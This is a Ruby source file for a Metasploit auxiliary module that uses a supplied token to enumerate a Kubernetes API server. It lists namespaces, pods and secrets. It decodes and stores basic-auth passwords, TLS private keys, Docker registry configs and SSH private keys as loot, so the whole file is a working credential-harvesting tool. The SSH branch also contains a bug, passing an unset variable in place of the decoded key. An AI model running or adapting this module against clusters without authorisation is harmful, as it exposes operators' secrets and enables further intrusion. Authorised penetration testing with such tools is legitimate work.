# -*- coding: binary -*-

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module Kubernetes
  module Error
    class ApiError < ::StandardError
    end

    class AuthenticationError < ApiError
    end

    class UnexpectedStatusCode < ApiError
      attr_reader :status_code

      def initialize(status_code)
        super
        @status_code = status_code
      end
    end
  end

  module Secret
    #
    # Secret types:
    #   https://kubernetes.io/docs/concepts/configuration/secret/
    #

    # Arbitrary user-defined data
    Opaque = 'Opaque'

    # service account token
    ServiceAccountToken = 'kubernetes.io/service-account-token'

    # serialized ~/.dockercfg file
    DockerConfiguration = 'kubernetes.io/dockercfg'

    # serialized ~/.docker/config.json file
    DockerConfigurationJson = 'kubernetes.io/dockerconfigjson'

    # credentials for basic authentication
    BasicAuth = 'kubernetes.io/basic-auth'

    # credentials for SSH authentication
    SSHAuth = 'kubernetes.io/ssh-auth'

    # data for a TLS client or server
    TLSAuth = 'kubernetes.io/tls'

    # bootstrap token data
    BootstrapTokenData = 'bootstrap.kubernetes.io/token'
  end

  class Client
    def initialize(config)
      @http_client = config.fetch(:http_client)
      @token = config[:token]
    end

    def list_namespace(options = {})
      _res, json = call_api(
        {
          'method' => 'GET',
          'uri' => http_client.normalize_uri('/api/v1/namespaces')
        },
        options
      )

      json
    end

    def list_secret(namespace, options = {})
      _res, json = call_api(
        {
          'method' => 'GET',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/secrets")
        },
        options
      )

      json
    end

    def list_pod(namespace, options = {})
      _res, json = call_api(
        {
          'method' => 'GET',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/pods")
        },
        options
      )

      json
    end

    def create_pod(data, namespace, options = {})
      res, json = call_api(
        {
          'method' => 'POST',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/pods"),
          'data' => JSON.pretty_generate(data)
        },
        options
      )

      if res.code != 201
        raise Kubernetes::Error::UnexpectedStatusCode.new(res.code)
      end

      json
    end

    def delete_pod(name, namespace, options = {})
      _res, json = call_api(
        {
          'method' => 'DELETE',
          'uri' => http_client.normalize_uri("/api/v1/namespaces/#{namespace}/pods/#{name}"),
          'headers' => {}
        },
        options
      )

      json
    end

    private

    attr_reader :http_client

    def call_api(request, options = {})
      token = options.fetch(:token, @token)

      res = http_client.send_request_raw(
        request.merge(
          {
            'headers' => request.fetch('headers', {}).merge(
              {
                'Authorization' => "Bearer #{token}",
                'Accept' => 'application/json'
              }
            )
          }
        )
      )

      if res.nil? || res.body.nil?
        raise Kubernetes::Error::ApiError
      elsif res.code == 401
        raise Kubernetes::Error::AuthenticationError
      end

      json = res.get_json_document
      if json.nil?
        raise Kubernetes::Error::ApiError
      end

      [res, json.deep_symbolize_keys]
    end
  end
end

module KubernetesEnumeration
  def enum_kubernetes_resources(kubernetes_client)
    enum_namespaces(kubernetes_client)
  end

  protected

  def enum_namespaces(kubernetes_client)
    namespaces = kubernetes_client.list_namespace[:items]

    origin = create_credential_origin_service(
      {
        address: datastore['RHOST'],
        port: datastore['RPORT'],
        service_name: 'kubernetes',
        protocol: 'tcp',
        module_fullname: fullname,
        workspace_id: myworkspace_id
      }
    )

    # create_credential_login(login_data)
    # Print the available namespaces first
    print_namespaces(namespaces)

    # Split the information for each namespace separately
    namespaces.each do |namespace|
      namespace_name = namespace.dig(:metadata, :name)
      print_good("Namespace: #{namespace_name}")

      pods = kubernetes_client.list_pod(namespace_name)[:items]
      print_pods(namespace, pods)

      secrets = kubernetes_client.list_secret(namespace_name)[:items]
      print_secrets(namespace, secrets)
      report_secrets(origin, secrets)

      # secrets = kubernetes_client.list_config_map(namespace_name)[:items]
      # print_config_maps(namespace, secrets)
    end
  end

  def print_namespaces(namespaces)
    table = create_table(
      'Header' => 'Namespaces',
      'Columns' => ['#', 'name'],
    )

    namespaces.each.with_index do |item, i|
      table << [
        i,
        item.dig(:metadata, :name)
      ]
    end

    print_table(table)
  end

  def print_pods(namespace, pods)
    namespace_name = namespace.dig(:metadata, :name)
    table = create_table(
      'Header' => "Pods (namespace: #{namespace_name})",
      'Columns' => ['#', 'namespace', 'name', 'status', 'containers']
    )

    pods.each.with_index do |item, i|
      containers = item.dig(:spec, :containers).map { |container| "#{container[:name]} (#{container[:image]})" }
      table << [
        i,
        namespace_name,
        item.dig(:metadata, :name),
        item.dig(:status, :phase),
        containers.join(', ')
      ]
    end

    print_table(table)
  end

  def print_secrets(namespace, secrets)
    namespace_name = namespace.dig(:metadata, :name)
    table = create_table(
      'Header' => "Secrets (namespace: #{namespace_name})",
      'Columns' => ['#', 'namespace', 'name', 'type', 'data', 'age'],
    )

    secrets.each.with_index do |item, i|
      table << [
        i,
        namespace_name,
        item.dig(:metadata, :name),
        item.dig(:type),
        item.fetch(:data, {}).keys.join(','),
        item.dig(:metadata, :creationTimestamp)
      ]
    end

    print_table(table)
  end

  def report_secrets(origin, secrets)
    secrets.each do |secret|
      credential_data = {
        origin: origin,
        origin_type: :service,
        module_fullname: fullname,
        workspace_id: myworkspace_id,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      namespace_name = secret.dig(:metadata, :namespace)
      resource_name = secret.dig(:metadata, :name)
      loot_name_prefix = [
        datastore['RHOST'],
        namespace_name,
        resource_name
      ].join('_')

      case secret[:type]
      when Kubernetes::Secret::BasicAuth
        username = Rex::Text.decode_base64(secret.dig(:data, :username))
        password = Rex::Text.decode_base64(secret.dig(:data, :password))

        credential = credential_data.merge(
          {
            username: username,
            private_type: :password,
            private_data: password
          }
        )

        print_good("basic_auth #{resource_name}: #{username}:#{password}")
        create_credential(credential)
      when Kubernetes::Secret::TLSAuth
        tls_cert = Rex::Text.decode_base64(secret.dig(:data, :"tls.crt"))
        tls_key = Rex::Text.decode_base64(secret.dig(:data, :"tls.key"))
        tls_subject = OpenSSL::X509::Certificate.new(tls_cert).subject rescue nil
        loot_name = loot_name_prefix + (tls_subject ? tls_subject.to_a.map { |name, data, _type| "#{name}-#{data}" }.join("-") : '')

        path = store_loot("tls.key", 'text/plain', nil, tls_key, "#{loot_name}.key")
        print_good("tls_key #{resource_name}: #{path}")

        path = store_loot("tls.cert", 'text/plain', nil, tls_cert, "#{loot_name}.crt")
        print_good("tls_cert #{resource_name}: #{path} (#{tls_subject ? tls_subject : "No Subject"})")
      when Kubernetes::Secret::DockerConfigurationJson
        json = Rex::Text.decode_base64(secret.dig(:data, :".dockerconfigjson"))
        loot_name = loot_name_prefix + "-json"

        path = store_loot("docker.json", 'application/json', nil, json, loot_name)
        print_good("dockerconfig json #{resource_name}: #{path}")
      when Kubernetes::Secret::SSHAuth
        data = Rex::Text.decode_base64(secret.dig(:data, :"ssh-privatekey"))
        loot_name = loot_name_prefix + "-ssh_key"
        private_key = parse_private_key(data)

        credential = credential_data.merge(
          {
            private_type: :ssh_key,
            public_data: private_key&.public_key,
            private_data: private_key
          }
        )
        begin
          create_credential(credential)
        rescue => _e
          vprint_error("Unable to store #{loot_name} as a valid ssh_key pair")
        end

        path = store_loot("id_rsa", 'text/plain', nil, json, loot_name)
        print_good("ssh_key #{resource_name}: #{path}")
      end
    rescue => e
      elog("Failed parsing secret #{resource_name}", error: e)
      print_error("Failed parsing secret #{resource_name}: #{e.message}")
    end
  end

  def create_table(options)
    default_options = {
      'Indent' => indent_level,
      # For now, don't perform any word wrapping on the table as it breaks the workflow of
      # copying container/secret names
      'WordWrap' => false,
      'ColProps' => {
        'data' => {
          'Stylers' => [Msf::Ui::Console::TablePrint::HighlightSubstringStyler.new([datastore['HIGHLIGHT_PATTERN']])]
        },
        'name' => {
          'Stylers' => [Msf::Ui::Console::TablePrint::HighlightSubstringStyler.new([datastore['HIGHLIGHT_PATTERN']])]
        },
        'age' => {
          'Formatters' => [Msf::Ui::Console::TablePrint::AgeFormatter.new],
        }
      }
    }

    Rex::Text::Table.new(default_options.merge(options))
  end

  def indent_level
    2
  end

  def print_table(table)
    print(table.to_s)
    print_line("#{' ' * indent_level}No rows") if table.rows.empty?
    print_line
  end

  def parse_private_key(data)
    passphrase = nil
    ask_passphrase = false

    private_key = Net::SSH::KeyFactory.load_data_private_key(data, passphrase, ask_passphrase)
    private_key
  rescue => _e
    nil
  end
end

class MetasploitModule < Msf::Auxiliary
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include KubernetesEnumeration

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kubernetes Enumeration',
        'Description' => %q{
          Enumerate a Kubernetes API to report useful resources such as available namespaces,
          pods, secrets, etc.

          Useful resources will be highlighted, which is customizable via the HIGHLIGHT_PATTERN
          option.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'alanfoster'
        ],
        'Notes' => {
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [],
          'Stability' => [CRASH_SAFE]
        },
        'DefaultOptions' => {
          'SSL' => true
        },
      )
    )

    register_options(
      [
        Opt::RHOST('127.0.0.1'),
        Opt::RPORT(6443),
        OptString.new('TOKEN', [true, 'Kubernetes API token']),
        OptRegexp.new('HIGHLIGHT_PATTERN', [true, 'PCRE regex of resource names to highlight', 'username|password|user|pass']),
      ]
    )
  end

  def run
    kubernetes_client = Kubernetes::Client.new({ http_client: self, token: datastore['TOKEN'] })
    enum_kubernetes_resources(kubernetes_client)
  end
end
